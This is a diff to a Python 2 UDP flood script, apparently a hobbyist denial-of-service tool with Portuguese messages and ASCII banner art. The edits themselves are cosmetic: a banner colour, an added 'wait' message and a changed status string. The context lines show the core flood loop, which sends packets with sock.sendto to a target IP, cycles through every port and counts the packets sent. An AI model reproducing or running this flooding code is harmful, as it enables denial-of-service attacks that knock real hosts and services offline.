@@ -52,7 +52,7 @@ print '''                 \033[94m.@@:       !@@@@:       .@@@
                   :#@@@#@@.        .#@@@@@@!
                          .##########:\033[0m
 
-\033[92m404404404404404404404404404404404404404404404404404404404404404404\033[0m
+404404404404404404404404404404404404404404404404404404404404404404\033[0m
 
 \033[91mCODDED BY\033[0m : \033[93mSAYONAR4-ONION\033[0m          \033[94m_  _    ___  _  _\033[0m
                                    \033[94m| || |  / _ \| || |\033[0m
@@ -102,6 +102,8 @@ print " proxy pronto"
 time.sleep(1)
 print "COMECANDO ATAQUE DOS"
 os.system("figlet GO 404")
+print "\033[92maguarda ai a porra vai comecar...\033[0m"
+time.sleep(2)
 os.system ("clear")
 sent = 0
 while True:
@@ -113,7 +115,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[91m[+]\033[0m \033[94mataque by 404\033[0m"
+     print "\033[91m[+]\033[0m \033[94mAttacking 404 Hell™\033[0m"
      print "\033[94m%s %s %s\033[0m"%(sent,ip,port)
      if port == 65534:
        port = 1
